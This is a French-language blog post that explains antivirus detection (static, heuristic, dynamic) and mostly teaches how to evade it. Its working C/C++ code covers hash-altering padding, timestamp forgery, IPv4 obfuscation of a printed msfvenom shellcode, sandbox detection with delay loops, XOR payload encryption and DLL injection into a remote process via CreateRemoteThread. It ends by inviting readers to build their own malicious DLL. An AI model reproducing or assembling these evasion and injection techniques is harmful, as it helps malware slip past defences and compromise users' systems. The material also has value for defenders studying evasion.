---
layout: post
author: [DJO, SSY, PLA, NDU]
title: "Comprendre le fonctionnement d'un antivirus 101 - détection sur le disque"
date: 2025-06-10
categories: [Articles, AD]
image: assets/AV.jpg
title_color: "#ffffff"
---

# Comprendre le fonctionnement d'un antivirus 101 - détection sur le disque

Les solutions antivirus modernes combinent plusieurs couches de défense pour détecter les fichiers malveillants. Leur fonctionnement repose sur différentes techniques :

* l'analyse statique (signatures, empreintes de fichiers) ;
* l'analyse heuristique (recherche de structures, de patterns ou d'instructions malveillantes). 
* l'analyse dynamique (comportement en temps réel dans un environnement dédié) ;

Dans cet article, nous explorerons un ensemble de techniques d'évasion permettant de contourner ces mécanismes et de réduire les risques de détection. 

## 1. L'analyse statique

### 1.1 Le fonctionnement

Les antivirus utilisent les signatures et les métadonnées pour identifier les fichiers malveillants. Une signature est une empreinte numérique unique permettant d’identifier un programme. Les métadonnées sont les informations associées au programme, comme les dates de création, d’accès et de modification d’un programme.

Une fois ces informations récupérées, elles sont comparées à la base de données des logiciels malveillants connus par l’antivirus.

Ces méthodes sont relativement basiques, et sont généralement inefficaces contre des malwares relativement nouveaux/peu connus, ou qui sont passés par un processus d'obfuscation.

Ce type d'analyse, effectuée sans exécuter le code malveillant, peut également se baser sur l'examination du code (via, par exemple, un désassembleur) afin de détecter des structures de code ou des appels à des API reconnus comme étant fréquemment utilisés de manière malveillante.

Un certain nombre de mesures peuvent être prises par un attaquant souhaitant échapper à ce type d'analyse. Nous vous présentons ici deux méthodes figurant parmi les plus utilisées.

### 1.2 Le contournement

#### 1.2.1 Modification des métadonnées

Afin de contourner l'analyse statique, il est nécessaire de modifier les informations d’identification d’un programme sans altérer son exécution.

Pour exemple, cette fonction ajoute des octets aléatoires à la fin du programme à chaque compilation du code source.

```c
void addRandomPadding(const char* filePath) {
    std::ofstream file(filePath, std::ios::app | std::ios::binary);
    if (file.is_open()) {
        for (int i = 0; i < 1024; ++i) {
            char randomByte = rand() % 256;
            file.write(&randomByte, 1);
        }
        file.close();
        std::cout << "Padding ajouté au fichier: " << filePath << std::endl;
    } else {
        std::cerr << "Impossible d'ajouter le padding au fichier: " << filePath << std::endl;
    }
}
```

Cette modification aura pour conséquence de radicalement modifier la signature du fichier et empêchera (au moins par ce biais ...) l’identification du programme dans la base de données de l’antivirus.

```bash
$ md5sum bad_program.exe

4cea3124039df840eb85e286e711b1cf  bad_program.exe

$ md5sum bad_program.exe

c0af7d3c9b20a30c34b6ca06d30b8894  bad_program.exe
```

Les antivirus utilisent souvent les horodatages des fichiers (création, modification et dernier accès) comme indicateurs potentiels pour identifier des fichiers malveillants. Par exemple un fichier dont la date de modification est antérieure à la date de création peut indiquer une manipulation malveillante. 

En second exemple, cette fonction en C++ permets de modifier l'horodatage d'un fichier. En uniformisant ces dates, elle réduit les incohérences temporelles susceptibles d'éveiller les mécanismes de protection d'un antivirus : 

```c
void modifyFileTimestamp(const char* FilePath) {
    HANDLE hFile = CreateFile(FilePath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        FILETIME ft;
        GetSystemTimeAsFileTime(&ft);
        SetFileTime(hFile, &ft, &ft, &ft);
        CloseHandle(hFile);
        std::cout << "Timestamps modifies avec succes pour: " << FilePath << std::endl; 
        }
    else {
        std::cerr << "Impossible de modifier le timestamps du fichier: " << FilePath << std::endl;
    }
}
```

Ainsi un antivirus vérifiant l’horodatage d’un programme pour le comparer à celui des fichiers malveillants connus dans sa base de données ne pourra pas l’identifier.

```
$ stat bad_program.exe

File: bad_program.exe
  Size: 921088          Blocks: 1800       IO Block: 4096   regular file
  Device: 8,1     Inode: 5385876     Links: 1
  Access: 2024-11-20 10:01:37.079506160 -0500
  Modify: 2024-11-20 10:01:33.855500945 -0500
  Change: 2024-11-20 10:01:33.855500945 -0500
  Birth: 2024-11-20 10:01:33.723500730 -0500

$ stat bad_program.exe

File: bad_program.exe
  Size: 921088          Blocks: 1800       IO Block: 4096   regular file
  Device: 8,1     Inode: 5385876     Links: 1
  Access: 2024-11-15 14:00:00.000000000 -0500
  Modify: 2024-11-15 14:00:00.000000000 -0500
  Change: 2024-11-15 14:00:00.000000000 -0500
  Birth: 2024-11-15 14:00:00.000000000 -0500
```

Comme nous venons de le voir, la manipulation des métadonnées et des éléments de signature d'un exécutable est facilement réalisable, et représente donc une méthode peu fiable de détection.

L'analyse statique peut donc également s'appuyer sur des méthodes d'analyses heuristiques, permettant une examination plus en détail du code, afin de localiser des structures ou des patterns généralement reconnus comme pouvant être utilisés à des fins malveillantes.
#### 1.2.2 Obfuscation du code

L'obfuscation du code -sorte de camouflage- peut être utilisée afin de masquer la logique ou les actions effectuées lors de l'exécution du code.

Changer le code de l'exécutable malveillant de manière dynamique peut également permettre d'échapper à la détection statique. Certains malwares peuvent en effet "modifier" leur code à chaque exécution ; si le principe de polymorphie/métamorphie est trop complexe pour être évoqué dans cet article d'introduction, l'obfuscation de scripts (macros, commandes Powershell, shellcodes, par exemple) est très répandue, et quasiment obligatoire pour échapper à la détection basée sur des règles.

Là encore, il s'agit de compliquer la tâche de l'AV en faisant en sorte que le code en lui-même s'éloigne un peu des schémas trop habituels et/ou précédemment détectés.

Voici un simple exemple d'obfuscation de shellcode sous forme d'IPv4 :

```c
#include <Windows.h>
#include <stdio.h>

char* GenerationIpv4(int a, int b, int c, int d) {
    unsigned char Output[32];

    // Creation de l'adresse IPv4
    sprintf(Output, "%d.%d.%d.%d", a, b, c, d);

    return (char*)Output;
}

BOOL ShellcodeToIPV4(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
    if (pShellcode == NULL || ShellcodeSize == 0 || ShellcodeSize % 4 != 0) {
        return FALSE;
    }

    int totalAddresses = (int)(ShellcodeSize / 4);
    printf("char* Ipv4Array[%d] = {\n\t", totalAddresses);

    int addressCount = 0;
    char* ipAddress = NULL;

    for (SIZE_T i = 0; i < ShellcodeSize; i += 4) {
        // Generation d'une IPv4 a partir de 4 bytres
        ipAddress = GenerationIpv4(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3]);
        
        printf("\"%s\"", ipAddress);
        addressCount++;

        // Ajout potentiel d'une virgule
        if (i + 4 < ShellcodeSize) {
            printf(", ");
        }

        // Ajout d'une newline après 8 adresses
        if (addressCount % 8 == 0 && i + 4 < ShellcodeSize) {
            printf("\n\t");
        }
    }

    printf("\n};\n\n");
    return TRUE;
}


int main()
{
    //Un simple payload msfvenom Windows/calc.exe
    unsigned char buf[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

    SIZE_T shellcodeSize = sizeof(buf) - 1;

    ShellcodeToIPV4(buf, shellcodeSize);

    return 0;
    
}
```

```c
//Output :
char* Ipv4Array[69] = {
        "252.72.131.228", "240.232.192.0", "0.0.65.81", "65.80.82.81", "86.72.49.210", "101.72.139.82", "96.72.139.82", "24.72.139.82",
        "32.72.139.114", "80.72.15.183", "74.74.77.49", "201.72.49.192", "172.60.97.124", "2.44.32.65", "193.201.13.65", "1.193.226.237",
        "82.65.81.72", "139.82.32.139", "66.60.72.1", "208.139.128.136", "0.0.0.72", "133.192.116.103", "72.1.208.80", "139.72.24.68",
        "139.64.32.73", "1.208.227.86", "72.255.201.65", "139.52.136.72", "1.214.77.49", "201.72.49.192", "172.65.193.201", "13.65.1.193",
        "56.224.117.241", "76.3.76.36", "8.69.57.209", "117.216.88.68", "139.64.36.73", "1.208.102.65", "139.12.72.68", "139.64.28.73",
        "1.208.65.139", "4.136.72.1", "208.65.88.65", "88.94.89.90", "65.88.65.89", "65.90.72.131", "236.32.65.82", "255.224.88.65",
        "89.90.72.139", "18.233.87.255", "255.255.93.72", "186.1.0.0", "0.0.0.0", "0.72.141.141", "1.1.0.0", "65.186.49.139",
        "111.135.255.213", "187.240.181.162", "86.65.186.166", "149.189.157.255", "213.72.131.196", "40.60.6.124", "10.128.251.224", "117.5.187.71",
        "19.114.111.106", "0.89.65.137", "218.255.213.99", "97.108.99.46", "101.120.101.0"
};
```

Cet exemple d'obfuscation de shellcode relativement basique nous permets d'obtenir un array contenant un ensemble d'IPv4, que l'on peut alors placer dans l'exécutable malveillant et dé-obfusquer uniquement au moment où l'exécution du shellcode sera nécessaire. (ici, un simple lancement de calculatrice sous Windows ...)

Si l'analyse statique est plus rapide et moins gourmande en ressources, elle est généralement insuffisante face à un programme malveillant suffisamment élaboré, et peut donner lieu à de nombreux cas de faux positifs / faux négatifs.

Au contraire, l'analyse dynamique peut demander plus de ressources et être plus lente, mais elle permet l'exécution d'un exécutable supposé malveillant dans un bac à sable ("sandbox") sécurisé. Cette approche offre alors la possibilité d'examiner les agissements précis de l'exécutable, de déterminer la dangerosité de son comportement et son impact sur le système ou dans l'environnement dans lequel il est exécuté.

### 2. Analyse dynamique/comportementale

#### 2.1 Le fonctionnement

La détection "behavior-based" (basée sur l'analyse comportementale, donc), si elle a le mérite d'être présente au sein des solutions anti-virus (AV) un minimum évolués, est en revanche relativement limitée.

S'appuyant lourdement sur la surveillance des processus, de scripts, ou de fichiers ou emplacements spécifiques, ainsi que sur un ensemble de "règles" (patterns) pré-définies relativement simplistes, nous constatons que les AV sont encore très dépendants à l'analyse statique et par signature.
De plus, au contraire des EDR, ils sont généralement dépourvus de systèmes de corrélation de processus (généralement par machine-learning) ou de télémétrie avancés, et sont par conséquent plus vulnérables à une certaine "segmentation" des attaques ou aux diverses techniques de camouflages.

Echapper à leurs stratégies de détection requiert néanmoins de prêter attention à quelques uns de ces éléments, dont nous vous livrons un aperçu non-exhaustif à travers ces quelques éléments :

#### 2.2 Les contournements possibles
####  2.2.1 Eviter les patterns d'évasion trop répandus

Les AV s'appuient généralement sur un ensemble de règles définissant des "patterns" d'évasion généralement connus ou fréquemment utilisées par des exécutables ou du code malveillant.

L'appel systématique et/ou trop "évident" à des fonctions de l'API Windows régulièrement utilisées par des malwares (appels trop directs à "CreateRemoteThread()", utilisation de fonctions cryptographiques issues du WinAPI, etc ... ) est un exemple de comportement à éviter.

#### 2.2.2 Minimiser son empreinte

Eviter de surcharger le nombre d'actions surveillées, suspectes ou facilement détectables en une seule exécution est un des moyens de minimiser son empreinte.
L'utilisation d'un *stager* (ou de plusieurs !) s'avère ici relativement efficace : mettre au point des fonctions de téléchargement de divers payloads en fonction du contexte, ou après s'être assuré que l'environnement d'exécution est "sécurisée".

Diviser les actions malveillantes en plusieurs étapes, et essayer de faire passer chacune de ces actions pour quelque chose d'inoffensif peut aider à réduire l'empreinte aux yeux de l'AV, et réduit d'autant les chances de s'enfermer dans un pattern pré-défini identifiable par celui-ci.

#### 2.2.3 Détournement d'applications légitimes ...

... ou "Living Off The Land" !
En fonction de l'environnement et des objectifs de l'exécutable malveillant, il existe désormais un grand nombre de sites référençant les applications et utilitaires supposés "de confiance", généralement présent par défaut au sein d'un système, et dont l'utilisation peut être détourné.

Utilisation de "mshta.exe", "explorer.exe", "bitsadmin.exe" (entre autres dizaines d'autres exemples), d'exécutables signés, ou d'applications légitimes pour exécuter des scripts ou télécharger des payloads sont quelques uns des moyens habituels d'éviter de déclencher les règles de l'AV concernant les processus "autonomes" (standalone)

Des sites existants tentent de lister les différents exécutables et les différentes manières d'appliquer cette méthode, que ce soit pour [Windows](https://lolbas-project.github.io/#), [Linux](https://gtfobins.github.io/), [ActiveDirectory](https://lolad-project.github.io/), [ESXi](https://lolesxi-project.github.io/LOLESXi/#) ... et bien d'autres encore.

#### 2.2.4 Détection d'environnement de type Sandbox / VM

La sandbox fournit un environnement contrôlé et isolé permettant aux utilisateurs et aux solutions de sécurité d’exécuter des fichiers inconnus afin d’analyser des comportements potentiellement malveillants.

La méthode la plus fréquemment exploitée par les malwares pour contourner ces mécanismes d’analyse consiste à inspecter l’environnement d’exécution, à détecter la présence de signes d’instrumentation ou de débogage, et à masquer leurs actions malveillantes si nécessaire. Cela peut être accompli en identifiant des indices indiquant que l’environnement d’exécution n’est pas celui d’une machine physique. Les sandboxes ont souvent une configuration minimale (un seul processeur et une quantité de mémoire inférieur à 4 Go) pour économiser les ressources de la machine hôte par exemple.

Voici l’exemple d’une fonction permettant de détecter si le programme s’exécute dans un environnement suspect :

```c
bool isSandboxed() {
    SYSTEM_INFO sysInfo;
    MEMORYSTATUSEX memStatus;
 
    // Vérification des ressources système
    GetSystemInfo(&sysInfo);
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
 
    if (sysInfo.dwNumberOfProcessors < 2) {
        return true; // Sandbox détectée : moins de 2 CPU
    }
 
    if (memStatus.ullTotalPhys / (1024 * 1024) < 4096) {
        return true; // Sandbox détectée : moins de 4 Go de RAM
    }
 
    return false; // Aucun signe de sandbox détecté
}

```

De plus, les sandboxes disposent d’un temps limité pour analyser le comportement d’un programme pour des raisons d’efficacité et de performance ; pour éviter la détection, il est possible de ralentir l’analyse en insérant des tâches inutiles ou bénignes qui consomment du temps processeur. 
Cela permet de réduire les chances que l’analyse atteigne les parties critiques du programme avant la fin de la fenêtre d’observation.

```cpp
// Détection de sandbox
if (isSandboxed()) {
    std::cout << "[!] Sandbox détectée. Simulation de travail pour retarder l'analyse..." << std::endl;
    for (int i = 0; i < 1e9; ++i) {
        volatile int waste = i % 3; // Calcul inutile
    }
}
```

#### 2.2.5 Chiffrement de payloads

Tout comme l'obfuscation, le chiffrement du code malveillant est désormais un élément quasiment incontournable pour échapper à la détection des AV, pour échapper aux analyses statiques comme dynamiques.

Le but est ici d'empêcher l'AV d'analyser le véritable contenu du payload ou d'en déduire son intention. L'utilisation de "crypters" ou de "packers" donne lieu à une véritable course à l'armement entre les développeurs de malwares et ceux des solutions de sécurité.

Le chiffrement des scripts, des macros, ou plus généralement de code malveillant suivi de son déchiffrement en runtime dans la mémoire est un bon exemple d'une telle pratique.

De multiples algorithmes pourraient être cités (RC4, AES, par exemple), mais nous nous concentrerons ici sur un exemple très répandu, simple à implémenter, ne requierant aucune librairie additionnelle, et très léger : XOR !

Afin de ne pas se contenter d'une illustration trop simpliste (et trop aisée a casser par force brute par une solution de sécurité !), dans l'exemple suivant, la clé est un array de bytes. Chaque byte du shellcode est XORé avec un byte de la clé (réutilisée de manière cyclique, si la clé est plus courte que le shellcode).

```c
VOID XorByKeyArray(IN PBYTE pShellcode, IN SIZE_T sShellcodeSize, IN PBYTE bKey, IN SIZE_T sKeySize) {
	for (size_t i = 0, j = 0; i < sShellcodeSize; i++, j++) {
		if (j >= sKeySize){
			j = 0;
		}
		pShellcode[i] = pShellcode[i] ^ bKey[j];
	}
}
```


Si nous avons évoqué jusque là le shellcode et les diverses manières de le traiter afin de contourner les mécanismes de détection utilisés au sein des analyses statiques ou dynamiques, nous n'avions pas encore évoqué son utilisation à proprement parler.

Le shellcode peut être utilisé de nombreuses manières différentes, aussi avons nous décidé de nous concentrer sur une méthode relativement classique : l'injection.
## 3. L'injection de shellcode

### 3.1 Définition

L'injection de shellcode consiste à insérer du code exécutable directement dans la mémoire d'un processus cible, puis à détourner son flux d'exécution pour le lancer. Souvent compact et autonome, le shellcode est souvent conçu pour déclencher des actions ciblées, telles que l'exfiltration de données, établir un accès persistant sur un système, ou plus largement l'exécution de commandes arbitraires.

Dans un environnement Windows, le shellcode s'appuie régulièrement sur des fonctions issues du Windows API, telles que VirtualAlloc(), pour l'allocation de mémoire, CreateRemoteThread() ou NtQueueApcThread() pour initier son exécution.

Cette injection peut être réalisée sans s'appuyer sur une vulnérabilité préexistante, en utilisant des méthodes telles que l'allocation de mémoire directe (via des appels systèmes) ou l'injection dans un processus légitime (techniques du "process hollowing" ou de l'injection DLL). 

Une fois chargé en mémoire, le shellcode s'exécute dans l'espace d'adressage du processus, contournant certaines protections traditionnelles et compliquant l'analyse des solutions antivirales. 

Le chiffrement ou l'obfuscation de ce shellcode à la volée, telles qu'évoquées plus haut, compliquent également la détection par les solutions de sécurité.

### 3.2 Exemple d'injection de shellcode

Nous ne traiterons ici qu'une partie du code nécessaire à l'injection d'un shellcode dans un processus, grâce à un certain nombre de fonctions systèmes issues du Windows API.
Nous utiliserons ici la fonction CreateToolhelp32Snapshot(), qui permets d'obtenir un aperçu des processus actifs au moment de l'exécution.
Les fonctions Process32First() et Process32Next() (s'appuyant toutes deux sur une structure de type PROCESSENTRY32) seront ensuite utilisées pour parcourir les processus.

Nous utiliserons également VirtualAllocEx(), WriteProcessMemory() et CreateRemoteThread(), afin de manipuler de diverses manière un processus distant.

Nous sommes ainsi en mesure d'injecter une DLL spécifiquement préparée par nos soins auparavant et contenant notre payload malveillant ; celle-ci sera chargée via la fonction LoadLibraryW().


```c
BOOL HandleRemoteProcess(LPWSTR szProcessName, DWORD* dwProcessId, HANDLE *hProcess) {

	// Snapshot de la liste de processus actifs 
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	PROCESSENTRY32 Proc = { .dwSize = sizeof(PROCESSENTRY32) };

	// Récupération des infos du premier processus de la liste
	if (!Process32First(hSnapShot, &Proc)) {
		printf("!! - Erreur Process32First : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {

		//Si le processus match celui qu'on recherche ...
		if (_wcsicmp(Proc.szExeFile, szProcessName) == 0) {
			//... on extrait le PID du processus depuis la structure...
			*dwProcessId = Proc.th32ProcessID;
			//... et on ouvre un handle vers ce processus.
			*hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, Proc.th32ProcessID);
			if (*hProcess == NULL)
				printf("!! - Erreur OpenProcess : %d \n", GetLastError());

			break;
		}

		//Sinon, on continue à chercher à travers la liste
	} while (Process32Next(hSnapShot, &Proc));

_EndOfFunction:
	//Toujours fermer un handle ouvert (afin d'éviter le handle leaking)
	if (hSnapShot != NULL) {
		CloseHandle(hSnapShot);
	}
	if (*dwProcessId == NULL || *hProcess == NULL) {
		return FALSE;
	}
	return TRUE;
}


BOOL InjectDllToRemoteProcess(HANDLE hProcess, PWSTR DllName) {

	//Init. variables
	//Pointeurs 
	// ...vers LoadLibraryW
	LPVOID pLoadLibraryW = NULL;
	// ...vers plage mémoire dans remote process
	LPVOID pAddress = NULL;
	//Tailles
	// ... du nom de la DLL à charger (requis par VirtualAllocEx)
	// ... (longueur de la string W "DllName" * taille (en bytes) du type WCHAR)
	DWORD dwSizeToWrite = lstrlenW(DllName) * sizeof(WCHAR);
	// ... param. OUT de WriteProcessMemory (reçoit le nbr de bytes écrits)
	SIZE_T lpNumberOfBytesWritten = NULL;
	// Handle retourné par la fonction CreateRemoteThread
	HANDLE hThread = NULL;
	// State (utile pour un error handling propre, ie: pas de thread leaking)
	BOOL bSTATE = TRUE;

	//Trouver l'adresse de LoadLibraryW ...
	// L'adresse stockée sera utilisé dans le "thread entry" quand
	//	le nouveau thread sera créée dans le remote process
	pLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
	if (pLoadLibraryW == NULL) {
		printf("-!- Erreur GetProcAddress : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	//Allocation de la mémoire ds le remote process "hProcess" (dwSizetoWrite)
	pAddress = VirtualAllocEx(hProcess, NULL, dwSizeToWrite, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("-!- Erreur VirtualAllocEx : %d \n", GetLastError());
		bSTATE = FALSE;
		goto _EndOfFunction;
	}
	
	//Seulement nécessaire pour observer plus facilement dans le debugger ensuite
	printf("pAddress allouée à : 0x%p (Size: %d)\n", pAddress, dwSizeToWrite);
	printf("-#- Appuyer sur Entrée pour écrire le nom de la DLL en mémoire...\n");
	getchar();

	//Données écrites : nom de la DLL, "DllName", de taille == à "dwSizeToWrite"
	if (!WriteProcessMemory(hProcess, pAddress, DllName, dwSizeToWrite, &lpNumberOfBytesWritten) || lpNumberOfBytesWritten != dwSizeToWrite) {
		printf("-!- Erreur WriteProcessMemory : %d \n", GetLastError());
		bSTATE = FALSE;
		goto _EndOfFunction;
	}
	printf("-i- Succès : %d bytes écrites \n", lpNumberOfBytesWritten);
	printf("-#- Appuyer sur Entrée pour exécuter le payload ... \n");
	getchar();

	// Création du remote thread
	hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibraryW, pAddress, NULL, NULL);
	if (hThread == NULL) {
		printf("-!- Erreur CreateRemoteThread : %d \n", GetLastError());
		bSTATE = FALSE;
		goto _EndOfFunction;
	}

_EndOfFunction:
	if (hThread) {
		CloseHandle(hThread);
		return -1;
	}
	return 0;
}

```

Nous vous laissons évidemment intégrer tout cela dans une fonction main() par vous-même qui prendra une entrée utilisateur avec le nom de la DLL à injecter et le processus à cibler, ainsi que la liberté de créer votre propre DLL malveillante ... ;)
## 4. Conclusion

Si les techniques présentées permettent de contourner efficacement les antivirus classiques, les EDR (EndPoint Detection and Response) offrent une détection plus avancée des menaces, en combinant une analyse comportementale, la surveillance en temps réel et la corrélation d'évènements.
Des techniques d'évasion avancées, telles que le DLL Side-Loading, qui consiste à remplacer des bibliothèques dynamiques légitimes par des versions malveillantes, ou le Userland API Hooking, entre beaucoup d'autres, permettant d'intercepter et d'altérer les appels d'API, sont désormais couramment employées pour contourner les protection des EDR. 

Ces techniques seront plus amplement discutées et démontrées dans un futur article. Stay tuned !



